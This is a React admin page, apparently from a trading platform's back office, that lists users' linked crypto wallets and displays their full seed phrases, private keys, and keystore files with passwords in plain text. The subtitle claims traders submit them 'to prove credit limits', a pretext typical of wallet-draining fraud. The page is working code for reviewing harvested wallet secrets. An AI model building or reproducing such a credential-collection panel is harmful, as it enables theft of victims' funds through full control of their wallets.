import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useNavigate } from "react-router-dom";
import { walletLinkApi } from "../../../api/walletLink.api";
import { formatDate } from "../../../utils";

export default function WalletsPage() {
  const navigate = useNavigate();
  const qc = useQueryClient();
  const [filterQuery, setFilterQuery] = useState("");
  const [expandedWalletId, setExpandedWalletId] = useState<string | null>(null);
  const [successMsg, setSuccessMsg] = useState("");

  const { data: walletsData, isLoading, error } = useQuery({
    queryKey: ["executor-all-wallets"],
    queryFn: () => walletLinkApi.getAllWallets().then((r) => r.data.data),
  });

  const wallets = walletsData ?? [];

  const verifyWalletMutation = useMutation({
    mutationFn: (walletId: string) => walletLinkApi.verifyWallet(walletId),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ["executor-all-wallets"] });
      setSuccessMsg("Wallet status marked as verified!");
      setTimeout(() => setSuccessMsg(""), 5000);
    },
  });

  const filteredWallets = wallets.filter((w: any) => {
    const userMatch = w.user?.name?.toLowerCase().includes(filterQuery.toLowerCase()) || 
                      w.user?.email?.toLowerCase().includes(filterQuery.toLowerCase());
    const labelMatch = w.label?.toLowerCase().includes(filterQuery.toLowerCase());
    return userMatch || labelMatch;
  });

  if (isLoading) {
    return (
      <div className="max-w-6xl mx-auto space-y-4 py-8">
        <div className="h-12 bg-gray-200 animate-pulse rounded-2xl" />
        <div className="h-64 bg-gray-200 animate-pulse rounded-2xl" />
      </div>
    );
  }

  if (error) {
    return (
      <div className="max-w-6xl mx-auto py-12 text-center text-xs text-gray-500">
        Failed to query Linked Wallets from backend.
      </div>
    );
  }

  return (
    <div className="max-w-6xl mx-auto space-y-6">
      
      {/* Header and status flags */}
      <div className="flex justify-between items-center">
        <div>
          <h1 className="text-xl font-bold text-gray-800">Linked Custody Wallets</h1>
          <p className="text-xs text-gray-400 mt-0.5">Audit external wallet credentials submitted by traders to prove credit limits.</p>
        </div>
      </div>

      {successMsg && (
        <div className="p-4 bg-green-50 border border-green-150 rounded-2xl text-xs text-green-700 font-medium">
          {successMsg}
        </div>
      )}

      {/* Filter and Search Bar */}
      <div className="bg-white rounded-2xl border border-gray-100 p-4 shadow-sm flex items-center">
        <input
          type="text"
          value={filterQuery}
          onChange={(e) => setFilterQuery(e.target.value)}
          placeholder="Search by client name, email, or wallet brand (e.g. MetaMask)..."
          className="w-full bg-slate-50 border border-gray-150 rounded-xl px-4 py-2 text-xs focus:outline-none focus:border-[#2d6a4f]/50"
        />
      </div>

      {/* Wallets Table */}
      <div className="bg-white rounded-3xl border border-gray-100 overflow-hidden shadow-sm">
        {filteredWallets.length === 0 ? (
          <div className="p-12 text-center text-xs text-gray-400">
            No linked wallets matching filters found.
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-sm border-collapse">
              <thead>
                <tr className="bg-gray-50/50 text-[10px] font-bold text-gray-500 uppercase tracking-wider border-b border-gray-100">
                  <th className="px-6 py-4">Client Info</th>
                  <th className="px-6 py-4">Wallet Info</th>
                  <th className="px-6 py-4">Linked Date</th>
                  <th className="px-6 py-4">Status</th>
                  <th className="px-6 py-4 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 text-xs font-medium text-slate-700">
                {filteredWallets.map((wallet: any) => {
                  const isExpanded = expandedWalletId === wallet._id;
                  const detailsMap = wallet.details instanceof Map ? Object.fromEntries(wallet.details) : wallet.details || {};
                  
                  return (
                    <>
                      <tr key={wallet._id} className="hover:bg-gray-50/30">
                        <td className="px-6 py-4">
                          <button
                            onClick={() => navigate(`/executor/clients/${wallet.user?._id}`)}
                            className="font-extrabold text-slate-800 hover:text-[#2d6a4f] text-left"
                          >
                            {wallet.user?.name || "Deleted Trader"}
                          </button>
                          <span className="text-[10px] text-gray-400 block mt-0.5 font-mono">{wallet.user?.email || "-"}</span>
                        </td>
                        <td className="px-6 py-4">
                          <span className="font-extrabold text-gray-700 block">{wallet.label}</span>
                          <span className="text-[10px] bg-slate-50 border border-slate-100 text-slate-500 font-extrabold px-1.5 py-0.5 rounded uppercase tracking-wider mt-1 inline-block">
                            {detailsMap.connectType || "phrase"}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-slate-500 font-bold">
                          {formatDate(wallet.createdAt)}
                        </td>
                        <td className="px-6 py-4">
                          <span className={`text-[10px] font-bold px-2.5 py-0.5 rounded-full ${
                            wallet.isVerified ? "bg-green-50 text-green-700" : "bg-amber-50 text-amber-700"
                          }`}>
                            {wallet.isVerified ? "Verified" : "Pending Audit"}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-right space-x-2">
                          <button
                            onClick={() => setExpandedWalletId(isExpanded ? null : wallet._id)}
                            className="text-[10px] font-bold text-[#2d6a4f] hover:text-[#1a3a2a] px-2.5 py-1.5 rounded-xl border border-gray-150 bg-white hover:bg-slate-50 transition-colors cursor-pointer"
                          >
                            {isExpanded ? "Hide Credentials" : "View Credentials"}
                          </button>
                          {!wallet.isVerified && (
                            <button
                              onClick={() => verifyWalletMutation.mutate(wallet._id)}
                              disabled={verifyWalletMutation.isPending}
                              className="text-[10px] font-bold text-white bg-[#2d6a4f] hover:bg-[#1a3a2a] px-2.5 py-1.5 rounded-xl transition-colors cursor-pointer disabled:opacity-50"
                            >
                              Verify
                            </button>
                          )}
                        </td>
                      </tr>

                      {/* Expanded credentials drawer row */}
                      {isExpanded && (
                        <tr>
                          <td colSpan={5} className="px-8 py-4 bg-slate-50/50 border-y border-slate-100">
                            <div className="bg-white border border-gray-150 rounded-2xl p-5 shadow-inner max-w-3xl space-y-3 font-mono text-xs select-all text-slate-700 overflow-x-auto">
                              {detailsMap.connectType === "phrase" ? (
                                <div>
                                  <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Mnemonic / Seed Phrase:</strong>
                                  <span className="break-all font-semibold tracking-wide whitespace-pre-wrap">{detailsMap.phrase}</span>
                                </div>
                              ) : detailsMap.connectType === "privateKey" ? (
                                <div>
                                  <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Private Key Hex:</strong>
                                  <span className="break-all font-semibold tracking-wider">{detailsMap.privateKey}</span>
                                </div>
                              ) : detailsMap.connectType === "keystore" ? (
                                <div className="space-y-3">
                                  <div>
                                    <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Keystore JSON:</strong>
                                    <span className="break-all block bg-slate-50 p-2 rounded border border-gray-100">{detailsMap.keystore}</span>
                                  </div>
                                  <div>
                                    <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Password:</strong>
                                    <span className="font-semibold text-slate-900">{detailsMap.password}</span>
                                  </div>
                                </div>
                              ) : (
                                <div>
                                  <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Details Map:</strong>
                                  <pre className="break-all">{JSON.stringify(detailsMap, null, 2)}</pre>
                                </div>
                              )}
                            </div>
                          </td>
                        </tr>
                      )}
                    </>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

    </div>
  );
}
